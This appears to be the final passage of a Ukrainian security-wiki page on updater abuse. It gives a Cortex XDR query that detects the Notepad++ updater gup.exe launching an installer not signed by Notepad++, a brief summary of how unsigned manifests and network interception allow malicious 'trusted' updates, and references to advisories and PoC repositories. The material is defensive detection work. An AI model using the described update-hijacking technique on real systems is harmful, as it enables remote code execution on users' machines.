<summary>Cortex XDR XQL – <code>gup.exe</code> запускає інсталятор, який не є інсталятором Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ці шаблони застосовні до будь-якого updater, який приймає unsigned manifests або не перевіряє підписувачів інсталятора: перехоплення мережі + шкідливий інсталятор + sideloading із власним підписом дають змогу віддалено виконувати код під виглядом «довірених» оновлень.

---
## References
- [1] [Рекомендація з безпеки – Netskope Client для Windows – локальне підвищення привілеїв через підроблений сервер (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Рекомендація з безпеки Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – плагін Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – IPC-клієнт/експлойт Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – злам ASUS DriverHub, MSI Center, Acer Control Centre та Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – локальне підвищення привілеїв через файли, доступні для запису, в Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – підвищення привілеїв у агенті Windows](https://checkmk.com/werk/16361)
- [10] [PoC bloatware-pwn від sensepost](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer від CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – зловмисники, пов’язані з державами, експлуатують ланцюжок постачання Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – оновлення про інцидент із перехопленням інфраструктури](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – обхід виправлення CVE-2025-0309 у Netskope Client для Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – виявлення помилок підвищення привілеїв у Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
